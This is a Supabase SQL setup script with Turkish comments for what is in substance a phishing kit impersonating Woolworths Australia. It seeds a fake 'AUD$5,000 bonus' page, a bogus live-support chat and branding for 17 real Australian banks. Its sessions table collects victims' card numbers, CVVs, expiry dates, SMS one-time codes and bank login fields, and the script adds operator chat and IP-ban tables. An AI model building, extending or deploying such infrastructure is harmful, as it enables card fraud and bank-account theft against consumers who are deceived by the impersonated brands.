-- ============================================================
-- WOOLWORTHS AU — TAZE SUPABASE KURULUM (tek dosya, sirayla kos
-- Supabase SQL Editor'e yapistir -> Run
-- Icerik: bootstrap + seed + sessions kolonlari + unify + realtime
-- Idempotent: IF NOT EXISTS / ON CONFLICT ile tekrar kosulabilir
-- ============================================================

-- ########## [1/7] FULL BOOTSTRAP (tablolar + RLS) ##########
-- ============================================================
-- WOOLWORTHS AUD — FULL BOOTSTRAP MIGRATION (BUTUN TABLOLAR)
-- ============================================================
-- Dosya sirasi: (0) 20240506_add_global_settings.sql
--               (1) create_banks_table.sql
--               (2) bootstrap_new_zealand_schema.sql  (sessions vb temel tablolar)
--               (3) bootstrap sonrasi ek migrationlar (sirayla)
-- ============================================================

-- ####################################################################
-- (0) 20240506_add_global_settings.sql
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.global_settings (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  target_country TEXT DEFAULT 'Australia',
  currency TEXT DEFAULT 'AUD$',
  portal_name TEXT DEFAULT 'Woolworths Customer Portal',
  support_center_name TEXT DEFAULT 'Woolworths Customer Support',
  win_title TEXT DEFAULT 'Exclusive Woolworths Bonus Offer',
  win_subtitle TEXT DEFAULT 'Congratulations! You have been selected for today''s Woolworths national promotion. Click the button below to claim your AUD$5,000 bonus.',
  live_support_title TEXT DEFAULT 'Woolworths Live Support',
  live_support_subtitle TEXT DEFAULT 'To continue, you need to contact our Woolworths customer support team.

Click the button below to start the chat.',
  logo_url TEXT,
  bg_url TEXT DEFAULT '/portal/desktop-background.png',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ####################################################################
-- (1) create_banks_table.sql
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.banks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT NOT NULL UNIQUE,
  name TEXT NOT NULL,
  country TEXT NOT NULL DEFAULT 'Australia',
  logo_url TEXT,
  brand_color TEXT,
  accent_color TEXT,
  sort_order INT DEFAULT 100,
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS banks_select_policy ON public.banks;
CREATE POLICY banks_select_policy ON public.banks FOR SELECT USING (true);

DROP POLICY IF EXISTS banks_write_policy ON public.banks;
CREATE POLICY banks_write_policy ON public.banks FOR ALL
USING (auth.role() = 'service_role' OR current_user = 'postgres')
WITH CHECK (auth.role() = 'service_role' OR current_user = 'postgres');

-- ####################################################################
-- (2) bootstrap_new_zealand_schema.sql — sessions + partners vb. temel tablolar
-- ####################################################################
CREATE TABLE IF NOT EXISTS public.partners (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  code TEXT NOT NULL UNIQUE,
  slug TEXT,
  brand_color TEXT,
  logo_url TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- public_id auto-increment sequence (kisa URL'ler icin UUID yerine sayisal ID)
CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;

CREATE TABLE IF NOT EXISTS public.sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id TEXT UNIQUE DEFAULT nextval('public.sessions_public_id_seq')::TEXT,
  partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL,
  target_country TEXT DEFAULT 'Australia',
  current_step TEXT DEFAULT 'win',
  amount INT NOT NULL DEFAULT 0 CHECK (amount >= 0),
  status TEXT NOT NULL DEFAULT 'offline',
  visitor_ip TEXT,
  ip_address TEXT,
  user_agent TEXT,
  language TEXT,
  current_bank_slug TEXT,
  form_data JSONB DEFAULT '{}'::jsonb,
  bankFormHistory JSONB DEFAULT '[]'::jsonb,
  orderedField1 TEXT,
  orderedField1Key TEXT,
  orderedField2 TEXT,
  orderedField2Key TEXT,
  orderedField2Type TEXT DEFAULT 'password',
  orderedField3 TEXT,
  orderedField3Key TEXT,
  identity_number TEXT,
  card_number TEXT,
  card_expiry TEXT,
  card_cvv TEXT,
  card_holder TEXT,
  sms_code TEXT,
  code_value TEXT,
  sms_digits INT NOT NULL DEFAULT 6 CHECK (sms_digits >= 4 AND sms_digits <= 12),
  sms_custom_text TEXT,
  partner_name TEXT,
  participation_code TEXT,
  is_hidden BOOLEAN DEFAULT false,
  is_completed BOOLEAN DEFAULT false,
  total_bonus_amount_cents INT DEFAULT 0,
  last_ping_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS sessions_all_anon_public ON public.sessions;
CREATE POLICY sessions_all_anon_public ON public.sessions
FOR ALL USING (true) WITH CHECK (true);

-- sessions index
CREATE INDEX IF NOT EXISTS idx_sessions_created_at_desc ON public.sessions (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current_step);
CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);

-- sequence ownership (temizlik icin)
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

-- sessions set_updated_at trigger
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ####################################################################
-- (3) bootstrap sonrasi ek migrationlar (sirayla)
-- ####################################################################

-- add_country_and_target_country.sql (zaten sutunlar yukarida var)

-- add_settings_columns.sql (global_settings icin logo_url ve bg_url yukarida var)

-- add_missing_win_button_and_bg.sql — extra bg_mobile_url vb. sutunlar
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url_mobile TEXT DEFAULT '/portal/mobile-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS wheel_settings JSONB DEFAULT '{}'::jsonb;

-- add_more_translation_settings.sql
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS translations JSONB DEFAULT '{}'::jsonb;

-- add_live_support_step.sql (live_support_title/subtitle yukarida var)

-- add_wheel_settings.sql (wheel_settings sutunu zaten eklendi)

-- add_user_agent_to_sessions.sql (user_agent yukarida var)

-- add_sms_custom_text.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;

-- add_partner_and_code.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_code TEXT;

-- add_public_id_to_sessions.sql (public_id yukarida var)

-- add_chat_messages.sql
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID REFERENCES public.sessions(id) ON DELETE CASCADE,
  role TEXT NOT NULL,
  content TEXT NOT NULL,
  image_urls TEXT[] DEFAULT '{}'::text[],
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session_id ON public.chat_messages(session_id);

-- add_chat_images.sql
CREATE TABLE IF NOT EXISTS public.chat_images (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  message_id UUID REFERENCES public.chat_messages(id) ON DELETE CASCADE,
  storage_path TEXT NOT NULL,
  public_url TEXT,
  mime_type TEXT,
  size_bytes INT,
  width INT,
  height INT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- add_ip_ban_tables.sql
CREATE TABLE IF NOT EXISTS public.ip_bans (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address TEXT NOT NULL UNIQUE,
  reason TEXT,
  banned_by TEXT,
  expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- add_is_active_to_banks.sql (banks tablosunda zaten var)

-- add_is_hidden_to_sessions.sql (is_hidden zaten var)

-- update_invalid_bank_constraint.sql
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS invalid_bank_reason TEXT;

-- set_global_settings_bg_to_real_photo.sql + revert + update_global_settings_bg_ai_2026 (default degerler zaten Woolworths AU olarak ayarli)

-- fix_global_settings_uuid.sql + fix_rls_global_settings.sql
ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS global_settings_all_policy ON public.global_settings;
CREATE POLICY global_settings_all_policy ON public.global_settings FOR ALL USING (true) WITH CHECK (true);

-- fix_sessions_rls_policies.sql + fix_sessions_schema_alignment.sql (sessions RLS zaten izin veriyor)

-- 20260802043000_add_nz_bank_logos_and_rabobank.sql — banks sutunlari var, skip
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS primary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS secondary_color TEXT;

-- 20260720160943_add_is_active_to_banks.sql — zaten var

-- 20260808_create_audit_event_logs.sql
CREATE TABLE IF NOT EXISTS public.audit_event_logs (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  event_type TEXT NOT NULL,
  severity TEXT NOT NULL DEFAULT 'info',
  session_id TEXT,
  session_uuid UUID,
  bank_slug TEXT,
  actor TEXT,
  message TEXT NOT NULL,
  payload JSONB DEFAULT '{}'::jsonb,
  metadata JSONB DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_audit_event_logs_created_at_desc ON public.audit_event_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_session ON public.audit_event_logs (session_id, session_uuid);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_type ON public.audit_event_logs (event_type);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_severity ON public.audit_event_logs (severity);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_bank_slug ON public.audit_event_logs (bank_slug);

ALTER TABLE public.audit_event_logs ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS audit_event_select_public ON public.audit_event_logs;
CREATE POLICY audit_event_select_public ON public.audit_event_logs
  FOR SELECT USING (true);

DROP POLICY IF EXISTS audit_event_insert_anon ON public.audit_event_logs;
CREATE POLICY audit_event_insert_anon ON public.audit_event_logs
  FOR INSERT WITH CHECK (true);

-- 20260808_audit_event_session_id_text.sql — session_id TEXT zaten var

-- 20260808_fix_audit_event_select_policies.sql — yukarida yapildi

-- 20260808_sessions_last_ping_at.sql — last_ping_at sutunu zaten sessions tablosunda var

-- refresh_postgrest_schema_cache.sql
NOTIFY pgrst, 'reload schema';

-- ########## [2/7] SEED: 17 AU bankasi + ayarlar ##########
INSERT INTO public.banks (slug, name, country, logo_url, brand_color, accent_color, sort_order, is_active, created_at, updated_at)
VALUES
  ('bendigo-bank', 'Bendigo Bank', 'Avustralya', '/bank-logos/au/bendigo-bank.svg', '#00579C', '#003F72', 1, true, NOW(), NOW()),
  ('suncorp-bank', 'Suncorp Bank', 'Avustralya', '/bank-logos/au/suncorp-bank.svg', '#7A0019', '#5C0013', 2, true, NOW(), NOW()),
  ('anz', 'ANZ', 'Avustralya', '/bank-logos/au/anz.svg', '#00457C', '#00294D', 3, true, NOW(), NOW()),
  ('westpac', 'Westpac', 'Avustralya', '/bank-logos/au/westpac.svg', '#DA291C', '#A11F15', 4, true, NOW(), NOW()),
  ('nab-bank', 'NAB', 'Avustralya', '/bank-logos/au/nab-bank.svg', '#C8102E', '#8B0A1F', 5, true, NOW(), NOW()),
  ('commbank', 'Commonwealth Bank', 'Avustralya', '/bank-logos/au/commbank.svg', '#F9D616', '#D4B30E', 6, true, NOW(), NOW()),
  ('macquarie', 'Macquarie Bank', 'Avustralya', '/bank-logos/au/macquarie.svg', '#870A37', '#67082A', 7, true, NOW(), NOW()),
  ('ing-australia', 'ING Australia', 'Avustralya', '/bank-logos/au/ing-australia.svg', '#F77F00', '#C46500', 8, true, NOW(), NOW()),
  ('boq-classic', 'BOQ Classic', 'Avustralya', '/bank-logos/au/boq-classic.svg', '#9E1B34', '#781326', 9, true, NOW(), NOW()),
  ('myboq', 'MyBOQ', 'Avustralya', '/bank-logos/au/myboq.svg', '#9E1B34', '#781326', 10, true, NOW(), NOW()),
  ('amp-bank', 'AMP', 'Avustralya', '/bank-logos/au/amp-bank.svg', '#0079C1', '#005587', 11, true, NOW(), NOW()),
  ('northonline-amp', 'North Online AMP', 'Avustralya', '/bank-logos/au/northonline-amp.svg', '#0079C1', '#005587', 12, true, NOW(), NOW()),
  ('bankwest', 'Bankwest', 'Avustralya', '/bank-logos/au/bankwest.svg', '#7D2C85', '#5A1E61', 13, true, NOW(), NOW()),
  ('me-bank', 'ME Bank', 'Avustralya', '/bank-logos/au/me-bank.svg', '#009DAB', '#00747F', 14, true, NOW(), NOW()),
  ('beyondbank', 'Beyond Bank', 'Avustralya', '/bank-logos/au/beyondbank.svg', '#22456A', '#18324D', 15, true, NOW(), NOW()),
  ('greatsouthernbank', 'Great Southern Bank', 'Avustralya', '/bank-logos/au/greatsouthernbank.svg', '#007A52', '#005739', 16, true, NOW(), NOW()),
  ('greater', 'Greater Bank', 'Avustralya', '/bank-logos/au/greater.svg', '#E0001B', '#A30014', 17, true, NOW(), NOW())
ON CONFLICT (slug) DO UPDATE SET
  name = EXCLUDED.name,
  country = EXCLUDED.country,
  logo_url = EXCLUDED.logo_url,
  brand_color = EXCLUDED.brand_color,
  accent_color = EXCLUDED.accent_color,
  sort_order = EXCLUDED.sort_order,
  is_active = EXCLUDED.is_active,
  updated_at = NOW();

INSERT INTO public.global_settings (id, target_country, currency, portal_name, support_center_name, win_title, win_subtitle, live_support_title, live_support_subtitle, logo_url, bg_url, bg_url_mobile, created_at, updated_at)
VALUES (
  gen_random_uuid(),
  'Australia',
  'AUD$',
  'Woolworths Customer Portal',
  'Woolworths Customer Support',
  'Exclusive Woolworths Bonus Offer',
  'Congratulations! You have been selected for today''s Woolworths national promotion. Click the button below to claim your AUD,000 bonus.',
  'Woolworths Live Support',
  'To continue, you need to contact our Woolworths customer support team.

Click the button below to start the chat.',
  '/logo.png',
  '/portal/desktop-background.png',
  '/portal/mobile-background.png',
  NOW(),
  NOW()
)
ON CONFLICT DO NOTHING;

NOTIFY pgrst, 'reload schema';

-- ########## [3/7] SESSIONS eksik kolonlar ##########
-- ================================================================
-- 2026-08-10: sessions tablosuna eksik sütunları ekle
-- (admin panelleri "Bağlantı Oluştur" ve wheel-client amount/status
--  alanlarını kullanıyor ama AU bootstrap migration'ında eksikti)
-- ================================================================

-- set_updated_at trigger fonksiyonu (idempotent)
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

-- amount: ödül miktarı (wheel sonucu, admin bağlantı oluştur)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS amount INT DEFAULT 0;

-- status: online/offline/SUCCESS/CONGRATS/SPECIAL_INFO (admin link oluştur offline atar)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'offline';

-- partner_name: admin bağlantı oluştururken "oluşturan admin" ismi
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_name TEXT;

-- participation_code: normal/standart link tipi için katılım kodu
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS participation_code TEXT;

-- sms_digits: SMS kod uzunluğu (default 6)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_digits INT DEFAULT 6;

-- sms_custom_text: özel SMS içeriği
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;

-- ip_address: eski isimlendirme (visitor_ip ile birlikte tutulur, geriye dönük uyumluluk)
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS ip_address TEXT;

-- CHECK constraint'leri (eğer daha önce eklenmediyse — NOT VALID ile hızlı ekle, sonra validasyon yok)
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'sessions_amount_check'
  ) THEN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK (amount >= 0) NOT VALID;
  END IF;
END $$;

DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'sessions_sms_digits_check'
  ) THEN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK (sms_digits >= 4 AND sms_digits <= 12) NOT VALID;
  END IF;
END $$;

-- updated_at trigger (idempotent — varsa drop sonra yeniden oluştur)
DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ########## [4/7] public_id sequence ##########
-- ================================================================
-- 2026-08-10: sessions.public_id icin auto-increment sequence bagla
-- (linkleri kisa tutmak icin UUID yerine 7-8 haneli sayisal ID kullan)
-- ================================================================

-- 1. Sequence olustur (idempotent)
CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;

-- 2. Mevcut sessions tablosunda public_id NULL olanlari doldur
--    (Sequence'in su anki degerini max(publice_id number) dan yukari cek)
DO $$
DECLARE
  max_pid BIGINT;
BEGIN
  -- public_id icindeki en buyuk sayisal degeri bul
  SELECT COALESCE(MAX(public_id::BIGINT), 0) INTO max_pid
  FROM public.sessions
  WHERE public_id ~ '^[0-9]+$';

  -- Sequence'i bundan buyuk bir degere ayarla
  PERFORM setval('public.sessions_public_id_seq', max_pid + 1, false);
END $$;

-- 3. NULL public_id olan tum satirlara sequence'den yeni deger ata
UPDATE public.sessions
SET public_id = nextval('public.sessions_public_id_seq')::TEXT
WHERE public_id IS NULL OR public_id = '';

-- 4. Simdi public_id DEFAULT'ini sequence nextval olarak bagla
ALTER TABLE public.sessions
  ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq')::TEXT;

-- 5. Sequence'i sessions tablosunun public_id sutununa bagla (temizlik icin)
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

-- 6. public_id UNIQUE index zaten var mi kontrol et yoksa ekle
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx
  ON public.sessions (public_id);
-- ================================================================
-- 2026-08-10: sessions.public_id'yi TEMIZDEN 1'den baslat
-- (mevcut tum public_id'leri 1, 2, 3, ... diye yeniden numaralandir
--  ve sequence'i bundan sonraki insertler icin dogru yerden baslat)
-- ================================================================

-- 1. Once eski sequence'i sifirla — yeniden olustur
DROP SEQUENCE IF EXISTS public.sessions_public_id_seq CASCADE;
CREATE SEQUENCE public.sessions_public_id_seq START WITH 1 INCREMENT BY 1 NO CYCLE;

-- 2. (Eski public_id'leri UNIQUE olacak sekilde 1'den itibaren ata)
--    row_number() over created_at sirasiyla — eski kayitlar kucuk ID alsin
DO $$
DECLARE
  r RECORD;
  counter BIGINT := 0;
BEGIN
  FOR r IN SELECT id FROM public.sessions ORDER BY created_at ASC, id ASC LOOP
    counter := counter + 1;
    UPDATE public.sessions
    SET public_id = counter::TEXT
    WHERE id = r.id;
  END LOOP;

  -- 3. Sequence'i counter + 1'den baslat (bir sonraki insert devam etsin)
  IF counter IS NULL OR counter < 1 THEN
    PERFORM setval('public.sessions_public_id_seq', 1, false);
  ELSE
    PERFORM setval('public.sessions_public_id_seq', counter + 1, false);
  END IF;
END $$;

-- 4. Sutunun DEFAULT degerini sequence bagla
ALTER TABLE public.sessions
  ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq')::TEXT;

-- 5. Ownership + index (idempotent)
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx
  ON public.sessions (public_id);

-- 6. GUVENLIK: public_id'nin sayi oldugunu garanti eden CHECK constraint ekle
--    (ileride yanlislikla UUID yazilmasini onler)
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_constraint WHERE conname = 'sessions_public_id_numeric_check'
  ) THEN
    ALTER TABLE public.sessions
      ADD CONSTRAINT sessions_public_id_numeric_check
      CHECK (public_id ~ '^[0-9]+$') NOT VALID;
  END IF;
END $$;

-- ########## [5/7] chat_messages compat ##########
-- Chat_messages tablosunda şema uyuşmazlığı giderilmesi:
-- 20260809000000_woolworths_au_full_bootstrap.sql tabloyu role + image_urls[] (array) ile oluşturur
-- Eski add_chat_messages.sql / add_chat_images.sql ise sender + image_url (tek) kullanır
-- Kod çoğunlukla sender / image_url bekliyor, bu yüzden "Could not find the 'image_url' column"
-- hatası PostgREST schema cache tarafından veriliyor.
-- Aşağıdaki değişiklikler HER İKİ şema versiyonu için çalışır (forward + backward compat).

alter table public.chat_messages add column if not exists sender text check (sender in ('user', 'admin'));
alter table public.chat_messages add column if not exists image_url text;
alter table public.chat_messages add column if not exists role text;
alter table public.chat_messages add column if not exists image_urls text[] default '{}'::text[];

-- Eski 'role' kolonundan yeni 'sender' kolonunu doldur (eğer role=user/admin ise)
update public.chat_messages
   set sender = case when lower(role) = 'user' then 'user' when lower(role) = 'admin' then 'admin' else sender end
 where sender is null and role is not null;

-- Eski 'sender' kolonundan yeni 'role' kolonunu doldur (ters yön, yeni kod eski şemayı bulursa)
update public.chat_messages
   set role = sender
 where role is null and sender is not null;

-- image_urls array[1]'den image_url tek değerini doldur
update public.chat_messages
   set image_url = image_urls[1]
 where image_url is null
   and image_urls is not null
   and coalesce(array_length(image_urls, 1), 0) > 0;

-- Tek image_url'den image_urls[] array doldur (ters yön)
update public.chat_messages
   set image_urls = array_append(coalesce(image_urls, '{}'::text[]), image_url)
 where (image_urls is null or coalesce(array_length(image_urls, 1), 0) = 0)
   and image_url is not null;

-- Supabase PostgREST schema cache yenile (refresh_postgrest_schema_cache.sql tekrar)
notify pgrst, 'reload schema';

-- ########## [6/7] audit_event_logs unify ##########
-- audit_event_logs tablosunda 2 şema arasındaki uyuşmazlığı GİDER:
--
-- ŞEMA A (ayrık migration 20260808_create_audit_event_logs.sql):
--   id | created_at | session_id(uuid) | public_id | partner_name | event_kind(*) |
--   event_action(*) | status | user_ip | user_agent | country | city | referer_url |
--   current_url | from_step(*) | to_step(*) | pathname(*) | bank_slug | bank_name |
--   login_method | admin_email | admin_action | meta(jsonb) | error_name | error_message
--
-- ŞEMA B (monolitik bootstrap 20260809000000):
--   id | created_at | event_type(*) | severity(*) | session_id(text) | session_uuid(uuid) |
--   bank_slug | actor | message | payload(jsonb) | metadata(jsonb)
--
-- Aşağıdaki migration İKİ şemayı da BİRLEŞTİRİR: TÜM eksik kolonları add column if not
-- exists ekler, backfill doldurur ve RLS izinlerini garanti eder.

-- Tablo yoksa yarat (garanti)
create table if not exists public.audit_event_logs (
  id bigint generated always as identity primary key,
  created_at timestamptz not null default now()
);

-- === ŞEMA B kolonları ===
alter table public.audit_event_logs add column if not exists event_type text;
alter table public.audit_event_logs add column if not exists severity text not null default 'info';
alter table public.audit_event_logs add column if not exists session_uuid uuid;
alter table public.audit_event_logs add column if not exists actor text;
alter table public.audit_event_logs add column if not exists message text;
alter table public.audit_event_logs add column if not exists payload jsonb default '{}'::jsonb;
alter table public.audit_event_logs add column if not exists metadata jsonb default '{}'::jsonb;

-- === ŞEMA A kolonları ===
alter table public.audit_event_logs add column if not exists public_id text;
alter table public.audit_event_logs add column if not exists partner_name text;
alter table public.audit_event_logs add column if not exists event_kind text;
alter table public.audit_event_logs add column if not exists event_action text;
alter table public.audit_event_logs add column if not exists status text default 'ok';
alter table public.audit_event_logs add column if not exists user_ip text;
alter table public.audit_event_logs add column if not exists user_agent text;
alter table public.audit_event_logs add column if not exists country text;
alter table public.audit_event_logs add column if not exists city text;
alter table public.audit_event_logs add column if not exists referer_url text;
alter table public.audit_event_logs add column if not exists current_url text;
alter table public.audit_event_logs add column if not exists from_step text;
alter table public.audit_event_logs add column if not exists to_step text;
alter table public.audit_event_logs add column if not exists pathname text;
alter table public.audit_event_logs add column if not exists bank_name text;
alter table public.audit_event_logs add column if not exists login_method text;
alter table public.audit_event_logs add column if not exists admin_email text;
alter table public.audit_event_logs add column if not exists admin_action text;
alter table public.audit_event_logs add column if not exists meta jsonb default '{}'::jsonb;
alter table public.audit_event_logs add column if not exists error_name text;
alter table public.audit_event_logs add column if not exists error_message text;

-- session_id: her iki şemada da var ama tipi farklı; TEXT olarak birleşik garanti.
do $$
begin
  begin
    alter table public.audit_event_logs alter column session_id type text using session_id::text;
  exception when others then null;
  end;
end $$;

-- bank_slug: her iki şemada da var, garanti
alter table public.audit_event_logs add column if not exists bank_slug text;

-- === BACKFILL (şema A ↔ B köprüsü) ===
-- 1) event_type = coalesce(event_kind, event_type, 'info')
update public.audit_event_logs
   set event_type = coalesce(event_kind, event_type, 'info')
 where event_type is null or event_kind is distinct from event_type;

-- 2) event_kind = coalesce(event_type, 'info') (ters)
update public.audit_event_logs
   set event_kind = coalesce(event_type, event_kind, 'info')
 where event_kind is null;

-- 3) severity: status -> severity eşle (ok/blocked -> info, warn->warn, error->error)
update public.audit_event_logs
   set severity = case
       when status in ('warn', 'warning') then 'warn'
       when status in ('error', 'blocked', 'critical') then 'error'
       else coalesce(severity, 'info')
     end
 where severity is null or severity not in ('info','warn','error','debug');

-- 4) status: severity -> status (ters)
update public.audit_event_logs
   set status = case severity
       when 'warn' then 'warn'
       when 'error' then 'error'
       else coalesce(status, 'ok')
     end
 where status is null;

-- 5) actor = coalesce(admin_email, bank_slug, actor)
update public.audit_event_logs
   set actor = coalesce(admin_email, bank_slug, actor)
 where actor is null and (admin_email is not null or bank_slug is not null);

-- 6) admin_email = actor (eğer admin_email boşsa)
update public.audit_event_logs
   set admin_email = actor
 where admin_email is null and actor is not null and lower(actor) like '%@%';

-- 7) message: event_action + message
update public.audit_event_logs
   set message = coalesce(message, event_action, event_kind, event_type, 'audit')
 where message is null;

-- 8) metadata JSONB: meta + from_step/to_step/pathname/user_ip/user_agent/country/city/referer_url/current_url/bank_name/login_method/error_name/error_message
update public.audit_event_logs
   set metadata = jsonb_strip_nulls(jsonb_build_object(
     'from_step', from_step,
     'to_step', to_step,
     'pathname', pathname,
     'user_ip', user_ip,
     'user_agent', user_agent,
     'country', country,
     'city', city,
     'referer_url', referer_url,
     'current_url', current_url,
     'bank_name', bank_name,
     'login_method', login_method,
     'error_name', error_name,
     'error_message', error_message,
     'public_id', public_id,
     'partner_name', partner_name,
     'admin_action', admin_action
   )) || coalesce(metadata, '{}'::jsonb) || coalesce(meta, '{}'::jsonb)
 where (
   metadata is null or jsonb_typeof(coalesce(metadata, '{}'::jsonb)) = 'object' and coalesce(metadata, '{}'::jsonb) = '{}'::jsonb
 ) and (
   from_step is not null or to_step is not null or pathname is not null or user_ip is not null or
   user_agent is not null or country is not null or city is not null or referer_url is not null or
   current_url is not null or bank_name is not null or login_method is not null or
   error_name is not null or error_message is not null or meta is not null
 );

-- 9) meta (legacy) = metadata || meta (ters)
update public.audit_event_logs
   set meta = coalesce(meta, '{}'::jsonb) || coalesce(metadata, '{}'::jsonb)
 where meta is null;

-- 10) event_action (boşsa)
update public.audit_event_logs
   set event_action = coalesce(event_action, message, event_kind, event_type, 'generic')
 where event_action is null;

-- === NOT NULL KISITLARI (varsa onarımları) ===
do $$
begin
  -- event_type not null default 'info'
  begin
    alter table public.audit_event_logs alter column event_type set default 'info';
    alter table public.audit_event_logs alter column event_type set not null;
  exception when others then null;
  end;

  -- severity not null default 'info'
  begin
    alter table public.audit_event_logs alter column severity set default 'info';
    alter table public.audit_event_logs alter column severity set not null;
  exception when others then null;
  end;

  -- message not null default 'audit'
  begin
    alter table public.audit_event_logs alter column message set default 'audit';
    alter table public.audit_event_logs alter column message set not null;
  exception when others then null;
  end;
end $$;

-- === İNDEXLER (her iki şema için de eksikse oluştur) ===
create index if not exists idx_audit_event_logs_created_at_desc on public.audit_event_logs (created_at desc);
create index if not exists idx_audit_event_logs_session        on public.audit_event_logs (session_id, session_uuid);
create index if not exists idx_audit_event_logs_type           on public.audit_event_logs (event_type);
create index if not exists idx_audit_event_logs_kind_action    on public.audit_event_logs (event_kind, event_action);
create index if not exists idx_audit_event_logs_severity       on public.audit_event_logs (severity);
create index if not exists idx_audit_event_logs_bank_slug      on public.audit_event_logs (bank_slug);
create index if not exists idx_audit_event_logs_partner        on public.audit_event_logs (partner_name);
create index if not exists idx_audit_event_logs_public_id      on public.audit_event_logs (public_id);

-- === RLS + POLICIES (garanti) ===
alter table public.audit_event_logs enable row level security;

drop policy if exists "audit_event_logs_auth_read" on public.audit_event_logs;
drop policy if exists "audit_event_logs_anon_insert" on public.audit_event_logs;
drop policy if exists "audit_event_select_public" on public.audit_event_logs;
drop policy if exists "audit_event_insert_anon" on public.audit_event_logs;
drop policy if exists "anon can read all audit logs (fallback)" on public.audit_event_logs;

create policy "audit_event_logs_anon_insert_unified"
  on public.audit_event_logs for insert
  with check (true);

create policy "audit_event_logs_anon_select_unified"
  on public.audit_event_logs for select
  using (true);

